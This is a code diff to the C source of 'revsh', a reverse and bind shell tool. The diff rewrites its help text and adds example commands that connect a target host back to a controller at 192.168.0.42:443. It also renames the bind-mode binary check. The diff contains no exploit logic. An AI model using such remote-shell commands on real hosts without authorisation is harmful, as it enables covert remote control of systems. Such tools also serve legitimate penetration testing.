@@ -45,21 +45,24 @@
  *
  **********************************************************************************************************************/
 void usage(){
-	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-r RC_FILE]] [-b [-k]] [-t SECONDS] ADDRESS:PORT\n", \
+	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-r RC_FILE]] [-b [-k]] [-t SECONDS] [ADDRESS:PORT]\n", \
 			program_invocation_short_name);
-	fprintf(stderr, "\n\t-c\t\tRun in \"control\" mode.\t\t\t\t(Default is \"target\" mode.)\n");
-	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is Ephemeral Diffie-Hellman w/cert pinning.)\n");
-	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"/bin/bash\".)\n");
-	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"~/.revsh/keys\".)\n");
-	fprintf(stderr, "\t-r RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"~/.revsh/rc\".)\n");
-	fprintf(stderr, "\t-b\t\tStart in \"bind shell\" mode.\t\t\t(Default is \"reverse shell\" mode.)\n");
-	fprintf(stderr, "\t\t\tNote:  * The -b flag will need to be given on both the control and target hosts.\n");
-	fprintf(stderr, "\t\t\t       * Bind shell mode can also be enabled by invoking the binary as \"bindsh\" instead of \"revsh\".\n");
+	fprintf(stderr, "\n\t-c\t\tRun in controller mode.\t\t\t\t(Default is target mode.)\n");
+	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
+	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
+	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s/%s\".)\n", REVSH_DIR, KEYS_DIR);
+	fprintf(stderr, "\t-r RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s/%s\".)\n", REVSH_DIR, RC_FILE);
+	fprintf(stderr, "\t-b\t\tStart in \"bind shell\" mode.\t\t\t(Default is reverse shell mode.)\n");
 	fprintf(stderr, "\t-k\t\tStart the bind shell in \"keep-alive\" mode.\t(Ignored in reverse shell mode.)\n");
-	fprintf(stderr, "\t-t\t\tSet the connection timeout to SECONDS.\t\t(Default is 3600.)\n");
+	fprintf(stderr, "\t-t\t\tSet the connection timeout to SECONDS.\t\t(Default is %d.)\n", TIMEOUT);
 	fprintf(stderr, "\t-h\t\tPrint this help.\n");
-	fprintf(stderr, "\n\tNote: ADDRESS:PORT is an optional argument and revsh will default to the values built into the binary.\n");
-	fprintf(stderr, "\t      The default ADDRESS:PORT for this build is \"%s\".\n", ADDRESS);
+	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the controller.\t\t(Default is \"%s\".)\n", ADDRESS);
+	fprintf(stderr, "\n\tNotes:\n");
+	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
+	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as \"bindsh\" instead of \"revsh\".\n");
+	fprintf(stderr, "\n\tExample:\n");
+	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
+	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
 	fprintf(stderr, "\n\n");
 
 	exit(-1);
@@ -264,7 +267,7 @@ int main(int argc, char **argv){
 		buff_ptr++;
 	}
 
-	if(!strncmp(buff_ptr, "bind", 4)){
+	if(!strncmp(buff_ptr, "bindsh", 6)){
 		bindshell = 1;
 	}
 
